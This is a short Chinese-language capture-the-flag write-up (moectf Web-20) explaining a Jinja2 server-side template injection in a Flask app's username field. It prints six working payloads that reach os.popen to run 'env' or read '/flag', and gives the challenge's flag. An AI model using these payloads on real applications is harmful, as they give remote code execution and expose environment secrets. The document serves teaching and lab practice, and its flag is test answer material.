# Web-20｜第二十章 幽冥血海·幻语心魔

## 碎碎念

SSTI 注入（有点类似 SQL 注入）
***
## Writeup

观察 app.py，有一个非常危险的注入点（很像 SQL 注入）：

```python
login_msg = render_template_string(f"""
            <div class="login-result" id="result">
                <div class="result-title">阵法反馈</div>
                <div id="result-content"><div class='login-success'>欢迎: {username}</div></div>
            </div>
            """)
```

只要我们在 username 动手脚可以执行任意代码，这称为模板注入漏洞（SSTI），有以下几个方法均可用：

```python
{{ config.__class__.__init__.__globals__['os'].popen('env').read() }}
{{ lipsum.__globals__['os'].popen('env').read() }}
{{ request.application.__globals__["__builtins__"]["__import__"]("os").popen("env").read() }}
{% print(url_for.__globals__['__builtins__']['eval']("__import__('os').popen('env').read()"))%}
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('env').read()") }}{% endif %}{% endfor %}
{{self.__init__.__globals__.__builtins__.open('/flag').read()}}
```

得到 flag：

![](../../../../assets/Pasted%20image%2020251029201723.png)

最终 flag：`moectf{e26f1e2f-ab02-d924-898e-4aecb7d46b00}`